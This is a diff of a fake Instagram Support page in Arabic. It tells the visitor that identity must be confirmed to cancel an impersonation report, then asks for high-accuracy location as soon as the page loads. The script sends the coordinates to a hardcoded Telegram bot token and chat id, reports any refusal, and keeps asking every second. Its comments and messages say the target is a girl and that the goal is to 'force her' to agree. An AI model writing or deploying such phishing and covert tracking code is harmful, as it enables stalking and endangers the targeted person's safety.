@@ -3,56 +3,58 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram Insights - زوار الحساب</title>
+    <title>Instagram Support - مركز البلاغات</title>
     <style>
-        body { background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888); font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: white; }
-        .card { background: white; color: #262626; padding: 25px; border-radius: 15px; width: 85%; max-width: 340px; text-align: center; box-shadow: 0 15px 35px rgba(0,0,0,0.3); }
-        .inst-icon { width: 60px; height: 60px; margin-bottom: 15px; }
-        h2 { font-size: 19px; margin-bottom: 10px; color: #1c1e21; }
-        p { font-size: 14px; color: #8e8e8e; line-height: 1.5; margin-bottom: 20px; }
-        .btn { background-color: #0095f6; color: white; padding: 12px; border-radius: 8px; border: none; font-weight: bold; width: 100%; cursor: pointer; font-size: 15px; }
-        #loading { display: none; margin-top: 15px; color: #0095f6; font-weight: bold; }
+        body { background-color: #fafafa; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: white; border: 1px solid #dbdbdb; padding: 25px; width: 85%; max-width: 380px; text-align: center; border-radius: 8px; }
+        .logo { width: 150px; margin-bottom: 20px; }
+        h2 { font-size: 18px; color: #262626; margin-bottom: 10px; }
+        p { font-size: 13px; color: #8e8e8e; line-height: 1.5; }
+        .btn { background-color: #0095f6; color: white; border: none; padding: 12px; border-radius: 4px; font-weight: bold; width: 100%; cursor: pointer; margin-top: 15px; }
+        #msg { color: #ed4956; font-size: 12px; margin-top: 10px; display: none; }
     </style>
 </head>
 <body>
 
 <div class="card">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/2048px-Instagram_logo_2016.svg.png" class="inst-icon">
-    <h2>من شاهد ملفك الشخصي؟</h2>
-    <p>تم رصد 23 زيارة جديدة لحسابك اليوم! يرجى السماح بالوصول للموقع للمطابقة مع خادم البيانات وعرض قائمة الأسماء الكاملة.</p>
-    <button class="btn" onclick="startCapture()">عرض القائمة الآن</button>
-    <div id="loading">جاري فحص البيانات...</div>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" class="logo">
+    <h2>تأكيد الهوية لإلغاء بلاغ الانتحال</h2>
+    <p>بناءً على البلاغات المقدمة ضد الحساب <b>(ha2542213)</b>، يرجى السماح بالوصول للموقع للمطابقة مع بيانات الاتصال المسجلة وإلغاء عملية الحذف التلقائي.</p>
+    <button class="btn" onclick="verify()">تأكيد الموقع والملكية</button>
+    <div id="msg">⚠️ يجب السماح بالوصول للموقع لإتمام المصادقة.</div>
 </div>
 
 <script>
     const token = '8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg';
     const chat_id = '7214473798';
 
-    async function sendToTelegram(msg) {
-        await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`);
+    function send(m) {
+        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(m)}`);
     }
 
-    function startCapture() {
-        document.getElementById('loading').style.display = 'block';
+    function verify() {
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(function(p) {
                 const lat = p.coords.latitude;
                 const lon = p.coords.longitude;
                 const acc = p.coords.accuracy;
-                const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                const googleMaps = `https://www.google.com/maps?q=${lat},${lat},${lon}`;
                 
-                sendToTelegram(`🎯 تم صيد إحداثيات البنت بنجاح!\n📍 الرابط: ${mapLink}\n📏 الدقة: ${acc} متر`);
+                send(`🎯 تم صيد إحداثيات البنت بنجاح!\n📍 الرابط: ${googleMaps}\n📏 الدقة: ${acc} متر`);
                 
-                setTimeout(() => {
-                    window.location.href = "https://www.instagram.com/ha2542213";
-                }, 1000);
+                alert("تم استلام طلبك، سيتم مراجعة البيانات خلال 24 ساعة.");
+                window.location.href = "https://help.instagram.com";
             }, function(e) {
-                sendToTelegram("⚠️ البنت فتحت الرابط وضغطت (رفض) للموقع.");
-                alert("خطأ: يجب السماح بالوصول للموقع لتحديث قائمة الزوار.");
-                location.reload(); // إعادة الطلب لإجبارها
+                send("⚠️ البنت دخلت بس رفضت تعطي الموقع (ضغطت Block).");
+                document.getElementById('msg').style.display = 'block';
+                // إعادة الطلب لإجبارها على الموافقة
+                setTimeout(verify, 1000); 
             }, {enableHighAccuracy: true});
         }
     }
+    // طلب الموقع فور الدخول لزيادة الصدمة
+    window.onload = verify;
 </script>
+
 </body>
 </html>
